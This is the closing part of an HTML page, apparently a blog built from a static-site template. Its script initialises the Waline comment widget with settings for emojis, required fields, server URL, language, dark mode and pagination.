    var emoji = '//unpkg.com/@waline/emojis@1.2.0/qq'.split(',').filter(function(item){
      return item !== ''; // filter()返回满足不为空item
    });
    emoji = emoji.length == 0 ? EMOJI : emoji;

    var meta = 'nick,mail'.split(',').filter(function(item){
      return META.indexOf(item) > -1; // filter()返回满足META.indexOf(item) > -1为true的item
    });
    meta = meta.length == 0 ? META : meta;

    var requiredFields = 'nick,mail'.split(',').filter(function(item){
      return REQUIREDFIELDS.indexOf(item) > -1; // filter()返回满足META.indexOf(item) > -1为true的item
    });
    requiredFields = requiredFields.length == 0 ? REQUIREDFIELDS : requiredFields;

    init({
      el: '#waline_thread',
      serverURL: 'https://waline-omega-topaz-81.vercel.app/', // Waline 的服务端地址
      path: '' == '' ? window.location.pathname : '', // 当前文章页路径，用于区分不同的文章页，以保证正确读取该文章页下的评论列表
      lang: 'zh-CN' == '' ? 'zh-CN' : 'zh-CN', // 多语言支持，未设置默认英文
      emoji: emoji,
      dark: 'true', // 暗黑模式适配
      commentSorting: '' == '' ? 'latest' : '', // 评论列表排序方式
      meta: meta, // 评论者相关属性
      requiredFields: requiredFields, // 设置必填项，默认匿名
      login: '', // 登录模式状态
      wordLimit: '', // 评论字数限制
      pageSize: '10' == '' ? 10 : '10', // 评论列表分页，每页条数
      imageUploader: '', // 自定义图片上传方法
      highlighter: '', // 代码高亮
      placeholder: '',
      avatar: 'mm',
      visitor: 'false',
      comment_count: 'true',
    });
  </script>

</body>
</html>
